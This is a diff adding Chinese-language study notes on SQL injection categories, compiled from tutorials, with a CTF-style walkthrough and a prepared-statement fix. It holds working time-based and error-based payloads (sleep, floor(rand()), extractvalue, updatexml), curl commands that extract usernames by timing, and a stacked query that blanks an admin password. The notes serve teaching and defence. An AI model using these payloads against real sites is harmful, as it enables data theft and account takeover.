@@ -1,0 +1,164 @@
+8. SQL注入技术分类,以及每一种注入技术的作用
+基于时间的注入(time-based injection):
+参考网址:[User-Agent注入攻击和基于时间的注入](www.freebuf.com/articles/web/105124.html)
+作用:用于猜测数据库名、表名、字段名、数据信息等等
+    延时注入
+    许多 SQL 注入都是在尝试从网站中提取信息（例如用户名、密码或其他隐私信息）。但这条语句却不太一样，它请求数据库进程等待 20 秒。这种攻击属于 SQL 盲注，一般的 SQL 注入会将查询的结果返回到 WEB 页面中，而盲注的攻击者则看不到查询的输出，所以他们会另辟蹊径使用其他的方式来判断注入。两种常见的方法就是使 WEB 服务器产生错误或者产生延时。如上使用 sleep 会是 WEB 服务器等待 20 秒才进行响应，攻击者可以根据响应是否产生延时来判断是否存在注入漏洞。
+    示例
+    为了更好的说明，我使用 PHP 创建了一个不安全的应用，其中会将 User-Agent 保存到 MySQL 数据库中。这类代码可能会存在于真实的应用中用来分析信息，例如统计访问次数。
+    在这个示例中，我忽略了所有良好安全的编码习惯，因为我想阐述下 SQL 的工作原理。
+    再次警告：千万不要复制/粘贴以下代码！因为这些代码并不规范。
+    下面是 PHP 代码：
+    <?php
+    $link = new mysqli('localhost', 'insecure', '1ns3cur3p4ssw0rd', 'analytics');
+    $query = sprintf("INSERT INTO visits (ua, dt) VALUES ('%s', '%s')",
+           $_SERVER["HTTP_USER_AGENT"],
+           date("Y-m-d h:i:s"));
+    $link->query($query);
+    ?>
+    <html><head></head><body><b>Thanks for visiting</b></body></html>
+    这段代码会连接到本地的 analytics 数据库，并将访客 HTTP 头部的 User-Agent 字段不加过滤的插入到数据库中。
+    这就是一个 SQL 注入的例子，但是因为我们的代码不会产生任何错误，所以攻击者无法通过报错来得知是否存在注入漏洞，除非他们使用类似 sleep() 之类的方法。
+    为了验证是否存在注入漏洞，只需要执行如下命令（其中 insecure.php 就是上述示例代码）：
+    curl -A "Mozilla/5.0', (select*from(select(sleep(20)))a)) #" http://example.com/insecure.php
+    这样就会将 HTTP 头部的 User-Agent 字段设置为 Mozilla/5.0', (select*from(select(sleep(20)))a)) #。而我们不安全的 PHP 代码会不加过滤就直接将这些字符串插入查询语句中，此时的查询语句变成了如下样子：
+    INSERT INTO visits (ua, dt) VALUES ('Mozilla/5.0', (select*from(select(sleep(20)))a)) #', '2016-05-17 03:16:06')
+    本来应该插入两个值，但现在只会插入一个值 Mozilla/5.0 并执行 (select*from(select(sleep(20)))a) 语句（这会使数据库休眠 20 秒）。而 # 是注释符，意味着后续的语句被注释并忽略了（就是忽略了插入日期）。
+    此时的数据库中会出现这样一个条目：
+
+    +---------------------+---------------+
+    | dt                  | ua            |
+    +---------------------+---------------+
+    | 0                   | Mozilla/5.0   |
+    +---------------------+---------------+
+    请注意，其中日期值为 0，这正是 (select*from(select(sleep(20)))a) 语句执行的结果，另外 ua 的值为 Mozilla/5.0，而这可能就是攻击者成功执行 SQL 注入后留下的唯一痕迹了。
+    下面是接收到上述请求后服务器的运行结果，我们使用 time 命令来看看这个过程到底需要多长时间：
+    $ time curl -v -A "Mozilla/5.0', (select*from(select(sleep(20)))a) #" http://example.com/insecure.php
+    * Connected to example.com port 80 (#0)
+    > GET /insecure.php HTTP/1.1
+    > Host: example.com
+    > User-Agent: Mozilla/5.0', (select*from(select(sleep(20)))a) #
+    > Accept: */*
+    >
+    < HTTP/1.1 200 OK
+    < Date: Mon, 16 May 2016 10:45:05 GMT
+    < Content-Type: text/html
+    < Transfer-Encoding: chunked
+    < Connection: keep-alive
+    < Server: nginx
+
+    <html><head></head><body><b>Thanks for visiting</b></body></html>
+    * Connection #0 to host example.com left intact
+
+    real   0m20.614s
+    user   0m0.007s
+    sys    0m0.012s
+    看到 20 秒了吗，成功的执行了 SQL 注入。
+    漏洞利用
+    看到这，你也许会想“这的确很简单，但是黑客好像并没有攻击我的网站啊”。
+    但不幸的是，丰富的 SQL 语句使得哪怕是只有 3 行 PHP 代码的 insecure.php，也可以使得攻击者获得远不只使数据库睡眠 20 秒的效果。虽然攻击者执行的 INSERT INTO 的查询只会向数据库中写入数据，但这样仍然可以让他们提取出敏感信息和获取访问权限。
+    为了一个演示的例子，我们在数据库中创建了一个名为 user 的表，其中包含两个用户分别名为 root 和 john。下面来展示攻击者是如何发现存在 john 用户的，他们可以手工构造用户名并根据相应时间来判断是否存在这个用户。
+    例如：
+    curl -A "Mozilla/5.0', (select sleep(20) from users where substring(name,1,1)='a')) #" http://example.com/insecure.php
+    这个访问会被立即响应，因为数据库中并没有以 a 打头的用户名，但是
+    curl -A "Mozilla/5.0', (select sleep(20) from users where substring(name,1,1)='j')) #" http://example.com/insecure.php
+    这个请求却会花费 20 秒时间。这样在猜出用户名的首字母后，攻击者就可以继续猜测用户名第二个、第三个字母等等，相同的技术还可以用来从数据库中提取其他数据。
+    如果我们的应用比较复杂，例如是一个博客的评论系统，那么我们可以利用这个漏洞将数据库的一些信息转存到一条评论中，这样我们就可以通过访问网页直接查看到数据库信息了,这种方法通常会在需要提取大量数据时使用。
+    代码加固
+    加固代码最好的方式就是像如下这样:
+    <?php
+    $link = new mysqli('localhost', 'analytics_user', 'aSecurePassword', 'analytics_db');
+    $stmt = $link->prepare("INSERT INTO visits (ua, dt) VALUES (?, ?)");
+    $stmt->bind_param("ss", $_SERVER["HTTP_USER_AGENT"], date("Y-m-d h:i:s"));
+    $stmt->execute();
+    ?>
+    <html>
+    <head></head>
+    <body><b>Thanks for visiting</b></body>
+    首先将 SQL 查询语句使用 prepare 进行准备，随后使用 bind_param 绑定两个参数（User-Agent 和日期），最后才是使用 execute 执行查询。
+    bind_param 可以确保一些 SQL 特殊字符会先被进行转义，随后才被执行。现在让我们来看一看在收到跟之前一样的 SQL 注入后数据库中的条目是什么样子的：
+    +---------------------+----------------------------------------------------+
+    | dt                  | ua                                                 |
+    +---------------------+----------------------------------------------------+
+    | 2016-05-17 04:46:02 | Mozilla/5.0',(select*from(select(sleep(20)))a)) #  |
+    +---------------------+----------------------------------------------------+
+    此时，攻击者的 SQL 语句没有被执行而是被简单的存入了数据库当中。
+    总结
+    SQL 注入是攻击者最喜欢使用的攻击方式之一，它可能出任何由攻击者掌控输入的 WEB 应用中。最容易想象的就是出现在各种表单或 URL 之中，但即使是 HTTP 请求头部也同样可能出现。所以从安全角度来说，任何由 WEB 浏览器发送给 WEB 应用的数据都应当被假设为是恶意的。
+
+===============================================================================
+基于错误的注入(error-based injection):
+参考网址:[基于错误回显的SQL注入整理](http://www.51testing.com/html/26/n-3364326.html)
+作用:用于爆出数据库名、表名、字段名、数据信息等等
+    　　0x00 关于错误回显
+    　　用我自己的话来讲，基于错误回显的sql注入就是通过sql语句的矛盾性来使数据被回显到页面上（当然在实际应用中得能回显在页面上，一般的网站都回避免这种情况，哈哈，要是能碰上你就偷着乐吧）。
+    　　0x01  用于错误回显的sql语句（下面的函数楼主只在mysql下试过也能成功，其他数据库有待考证，待有实例的时候会补充）
+    　　第一种：  基于 rand()与group by 的错误
+    　　首先看一下关于rand()函数与group by 在mysql中的错误报告，没错，我们就是要利用group by part of rand() returns duplicate key error这个bug。
+    　　RAND() in a WHERE clause is re-evaluated every time the WHERE is executed.
+    　　You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times.
+    　　这个bug会爆出duplicate key这个错误，然后顺便就把数据也给爆了：
+    　　公式：username=admin' and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(你想获取的数据的sql语句))x from information_schema.tables group by x )a) and '1' = '1
+    　　第二种： XPATH爆信息
+    　　这里主要用到的是ExtractValue()和UpdateXML()这2个函数，由于mysql 5.1以后提供了内置的XML文件解析和函数，所以这种注入只能用于5.1版本以后
+    　　查看sql手册可知
+    　　语法：EXTRACTVALUE (XML_document, XPath_string);
+    　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+    　　第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
+    　　作用：从目标XML中返回包含所查询值的字符串
+    　　语法:UPDATEXML (XML_document, XPath_string, new_value);
+    　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+    　　第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
+    　　第三个参数：new_value，String格式，替换查找到的符合条件的数据
+    　　作用：改变文档中符合条件的节点的值
+    　　现在就很清楚了，我们只需要不满足XPath_string(Xpath格式)就可以了，但是由于这个方法只能爆出32位，所以可以结合mid来使用
+    　　公式1：username=admin' and (extractvalue(1, concat(0x7e,(你想获取的数据的sql语句)))) and '1'='1
+    　　公式2：username=admin' and (updatexml(1, concat(0x7e,(你想获取的数据的sql语句)),1)) and '1'='1
+    　　第三种： 重复列爆信息（对于这种方法，我在本地数据库上有试验成功，但是对于下面那道并没有什么作用，就不仔细说明了）
+    　　带上代码：
+    　　payload  id=330&sid=19&cid=261+and+exists(select*from+(select*from(select+name_const(@@version,0))a+join+(select+name_const(@@version,0))b)c)
+    　　0x02  应用
+    　　上面说了那么多，让我们来应用一下吧，基于这道题目
+    　　1.首先我们来爆出他的数据库名
+        结果：r0866cplushua
+    　　username=admin' and (select 5468 from (select count(*), concat(floor(rand(0)*2),0x23,(select database()))x from information_schema.tables group by x )a) and '1' = '1
+    　　2.然后爆他的数据库版本
+        结果:5.1.61-Alibaba-rds-201404-log
+    　　username=admin' and (select 5468 from (select count(*), concat(floor(rand(0)*2),0x23,(select version()))x from information_schema.tables group by x )a) and '1' = '1
+    　　3.接着爆他的表名
+        结果：log    motto   user  这里需要一条一条爆
+    　　username=admin' and (select 5468 from (select count(*), concat(floor(rand(0)*2),0x23,(select column_name from information_schema.tables where table_schema = 'r0866cplushua' limit 0,1))x from information_schema.tables group by x )a) and '1' = '1
+    　　4.然后再爆他的列名
+        结果：id  username  motto（这里我一开始试的是user表但是数据并没有我们想要的，所以换了motto，也需要一条一条的爆）
+    　　username=admin' and (select 5468 from (select count(*), concat(floor(rand(0)*2),0x23,(select column_name from information_schema.columns where table_name='motto' and table_schema = 'r0866cplushua' limit 0,1))x from information_schema.tables group by x )a) and '1' = '1
+    　　5.最后就是爆数据了
+        结果：key#notfound!#    (这里我使用了XPATH爆数据，因为不知道什么原因用第一种方法暴不出来)
+    　　username=admin%27%20and%20(extractvalue(1,%20concat(0x7e,(SELECT%20concat(username,0x3a,motto)%20FROM%20motto%20limit%203,1))))%20and%20%271%27=%271
+    　　到了这里这道题目就算是做出来了。由于楼主刚刚学起上面如果有什么错误，请路过的大牛指正谢谢，同时也希望大牛们可以分享一些其他的注错方法。
+======================================================================================
+基于bool的注入(boolean-based injection):
+参考网址:
+作用:
+基于union的注入(union-based injection):
+参考网址:
+作用:进行拖数据操作
+基于stack的注入(stacked-based injection)
+参考网址:
+作用:提权和越权,获取数据信息
+
+[防止sql注入和sqlmap介绍](http://www.cnblogs.com/Lawson/p/5089990.html)
+上面说了如何防止sql注入，下面简单介绍下神器sqlmap，它是一个典型的sql注入检测和利用工具。
+sqlmap支持5种sql注入模式：
+
+1、基于布尔的盲注（Boolean-based blind SQL injection），即可以根据返回页面判断条件真假的注入。
+比如对参数加一个' and '1'='1和' and '1'='2，如果第一个能查询出来，第二个不行，则说明可以注入，后面可以根据字段and exist(...)不断猜测。
+2、基于时间的盲注（Time-based blind SQL injection），即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+比如直接把某个参数的值删除，改为if((ascii(mid(user(),1,1))=103 and sleep(3))如果ascii(mid(user(),1,1))=103条件为真，则会等待3秒才返回结果，如果ascii(mid(user(),1,1))=103为假，则直接返回页面，这样不断猜测user()的第1,2,3个字符。
+3、基于报错注入（Error-based SQL injection），即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+比如在条件后面增加+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)，通过报错把user()显示出来，这个方法是最快的。
+这里报错注入的sql很不好理解，首先它实现的前提是如果sql报错了，后台配置的按照sql怎么出错怎么抛出异常到页面（即非友好页面），然后比如这里报错主要依靠floor(rand(0)*2)，rand(0)是mysql的一个函数，他会返回0到1之间的随机浮点数，rand(0)*2为1到2之间的随机浮点数，floor是往下取整的函数，比如floor(0.2)=0,floor(1.2)=1。这里group by x就非常重要了，比如我们查询select 1 from information_schema.tables group by rand(0) limit 0,30;将会查询30个1出来，原因是group by 一个随机数，每次都将查询不同的数据出来，limit限制30就显示30条。所以刚才试的sql语句，因为group by x，x的值是随机的，比如x值为~root@127.0.0.1~0，也可能为~root@127.0.0.1~1，group by 这个数据如果遇到两个相同的group key，则就报错了，如果页面吧错误抛出到页面，则可以通过正则匹配~和~符号之间的为user()的值，比如报错：Duplicate entry '~root@127.0.0.1~1' for key 'group_key'。
+4、联合查询注入（UNION query SQL injection），可以使用union的情况下的注入。
+这个很好理解，就是在select后union把数据查询出来，比如先在查询条件后输入order by 3,order by 4..到order by 8的时候报错了，说明select了7条记录。然后条件后输入 and 1=2 union select 1,user(),database()...查询7个数据出来，由于第一个select后有了1=2条件不成i，因此只会查询我们写的select语句，这样覆盖之前的查询记录返回出我们需要的数据，这个速度也非常快。
+5、堆查询注入（Stacked queries SQL injection），可以同时执行多条语句的执行时的注入。
+比如用;分隔后执行其他sql语句，一般用于更新数据或执行系统相关命令，比如在参数后面增加; update sysuser set password='' where username='admin'，或比如sqlserver执行exec master..xp_cmdshell，执行cmd命令创建远程登录用户等。
+sqlmap非常强大，可以get,post,httpheader的值变化识别是否存在注入，它可以自动识别MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB数据库，还有一些常用的绕过防止sql注入的替换符号，也可以自己扩展python脚本绕过WAF之类的防注入程序，常用参数和常用检测命令后续单独再写一个blog文章。
